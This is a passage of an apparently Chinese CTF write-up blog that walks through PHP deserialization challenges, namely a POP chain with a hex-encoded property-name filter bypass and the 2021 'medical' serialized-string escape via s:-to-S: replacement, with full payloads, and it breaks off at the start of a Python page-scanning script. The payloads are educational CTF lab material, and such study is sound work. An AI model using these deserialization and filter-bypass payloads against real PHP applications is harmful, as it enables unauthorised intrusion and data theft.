            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Yasuo! No Soul!\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Are you orphan?\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Must Be Yasuo!\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">jungle</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Lee Sin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token comment">//topsolo->__destruct()->TP()->$name()->midsolo->__invoke()->Gank()->stristr($this->name, 'Yasuo')->jungle->__toString()->KS()</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>题目给出了<code>cat /flag</code>的函数，于是我们只需要想办法触发该方法即可</p>
<p>分析反序列化链：</p>
<pre class="language-php" data-language="php"><code class="language-php">topsolo<span class="token operator">-></span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">midsolo</span><span class="token operator">-></span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">jungle</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>其中有几个需要绕过的点：</p>
<p><code>__wakeup</code>函数，老考点了，改变序列化后的对象属性即可</p>
<p>而在<code>common.php</code>中有个<code>check</code>函数需要绕过：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Name Pass\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>这里利用十六进制bypass属性名，即<code>name-&gt;\6e\61\6d\65</code></li>
</ul>
<p>于是构造payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jungle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">midsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">topsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0'</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0";s:7:"\0*\0pass";O:7:"topsolo":1:&#123;S:7:"\0*\0\6e\61\6d\65";O:7:"midsolo":2:&#123;S:7:"\0*\0\6e\61\6d\65";O:6:"jungle":1:&#123;S:7:"\0*\0\6e\61\6d\65";s:7:"Lee Sin";&#125;&#125;&#125;&#125;;'</span><span class="token punctuation">;</span></code></pre>

<p>传入即可<code>cat /flag</code></p>
<h3 id="2021-卫生健康行业CTF-medical"><a href="#2021-卫生健康行业CTF-medical" class="headerlink" title="[2021 卫生健康行业CTF]-medical"></a>[2021 卫生健康行业CTF]-medical</h3><p>题目提示：反序列化字符串逃逸；static目录下面有源码泄露；php的反序列化</p>
<p>static下有<code>www.zip</code>源码包</p>
<p>下下来看源码，采用的是MVC架构</p>
<p>直接看到<code>Service.class.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Service</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$_if_action</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$post</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$view</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">post</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$serialize_data</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">santi</span><span class="token punctuation">(</span><span class="token variable">$serialize_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/s:/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'S:'</span><span class="token punctuation">,</span> <span class="token variable">$serialize_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">user_view</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Location'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">user_view</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad strings."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>index方法中有反序列化点</p>
<p>看一下<code>user_view</code>方法，传入的值被当作字符串来使用</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_view</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">return_string</span><span class="token operator">!==</span><span class="token string single-quoted-string">'False'</span><span class="token operator">?</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">return_string</span><span class="token punctuation">:</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello,"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">return_string</span><span class="token operator">.</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"You have made an appointment successfully！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">return_string</span> <span class="token operator">=</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>看到<code>Request.class.php</code>中的魔术方法<code>__toString</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$hhhhh</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$hhhh</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'headers'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">apache_request_headers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hhhh</span><span class="token operator">.</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hhhhh</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>再看到<code>index.class.php</code>，其中有一个<code>__get</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$view</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$_if_action</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token comment">//        $this->view->html('home');</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function_name</span><span class="token punctuation">,</span> <span class="token variable">$function_arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$function_name</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">==</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token string single-quoted-string">'/hint'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>于是构造链路就出来了:<code>Request-&gt;__toString =&gt; Index-&gt;__get</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$hhhhh</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hhhhh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>结果如下</p>
<pre class="language-none"><code class="language-none">O:7:&quot;Request&quot;:1:&#123;s:5:&quot;hhhhh&quot;;O:5:&quot;Index&quot;:0:&#123;&#125;&#125;</code></pre>

<p>然而直接传是没有用的，index中<code>$data[&#39;Location&#39;]</code>的值还会是一个字符串类型的，写一个简单的例子</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	<span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span>
	<span class="token variable">$serialize_data</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/s:/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'S:'</span><span class="token punctuation">,</span> <span class="token variable">$serialize_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/s:/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'S:'</span><span class="token punctuation">,</span> <span class="token variable">$serialize_data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Location'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>post一个<code>Location=O:7:&quot;Request&quot;:1:&#123;s:5:&quot;hhhhh&quot;;O:5:&quot;Index&quot;:0:&#123;&#125;&#125;</code>，返回结果如下</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token constant">S</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Location"</span><span class="token punctuation">;</span><span class="token constant">S</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"O:7:"</span>Request<span class="token string double-quoted-string">":1:&#123;S:5:"</span>hhhhh<span class="token string double-quoted-string">";O:5:"</span>Index<span class="token string double-quoted-string">":0:&#123;&#125;&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token constant">D</span><span class="token punctuation">:</span>\phpstudy\<span class="token constant">WWW</span>\index<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token keyword type-declaration">string</span> <span class="token string single-quoted-string">'O:7:"Request":1:&#123;S:5:"hhhhh";O:5:"Index":0:&#123;&#125;&#125;'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">46</span><span class="token punctuation">)</span></code></pre>

<p>payload还是会被识别成字符串，这时候，题目中的<code>preg_replace</code>的作用就来了</p>
<p><strong>在php反序列化中，为了避免信息丢失，使用大写S支持字符串的编码。</strong></p>
<p>php为了更加方便的进行反序列化内容的传输与显示(避免都是某些控制字符等信息)，可以在序列化内容中使用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制进行表示，格式如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span>extrader<span class="token punctuation">;</span><span class="token operator">-></span><span class="token constant">S</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span>\<span class="token number">65</span>xtrader</code></pre>

<p>这时候我们就可以传入两个值来进行利用了，<code>$this-&gt;post</code>就是<code>$_POST</code>这个数组，payload如下</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span>\<span class="token number">31</span><span class="token operator">&amp;</span>Location<span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Location"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Request"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hhhhh"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Index"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>解释一下上面的payload</p>
<p>当上面这一串payload打到网站，<code>serialize($_POST)</code>后的值是</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>
    s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"\31\31\31\31\31\31\31\31\31\31\31"</span><span class="token punctuation">;</span>
    s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Location"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">63</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:8:"</span>Location<span class="token string double-quoted-string">";O:7:"</span>Request<span class="token string double-quoted-string">":1:&#123;s:5:"</span>hhhhh<span class="token string double-quoted-string">";O:5:"</span>Index<span class="token string double-quoted-string">":0:&#123;&#125;&#125;&#125;"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>但是这里<code>s:</code>替换成<code>S:</code>后，<code>\31</code>就自动转成<code>1</code>了，这样前面的33没变，但是后面的值变了，和反序列化字符串逃逸差不多，这里是长变短，一个<code>\31</code>多出两个字符，于是就可以想着去闭合后面的<code>&quot;;s:8:&quot;Location&quot;;s:63:</code>，22个字符（当然这里也可以不是Location，凑成双数即可），这样后面的<code>Location</code>就能生效反序列化识别成一个类了，至于后面多余的可以不用管，php会自动舍弃，于是我们传11个<code>\31</code>即可拿到<code>flag</code></p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-华北赛区-Day1-Web2—ikun"><a href="#CISCN2019-华北赛区-Day1-Web2—ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2—ikun"></a>CISCN2019-华北赛区-Day1-Web2—ikun</h3><p>根据题目提示需要买到lv6的账号，于是写脚本找</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn/shop?page=&#123;&#125;"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
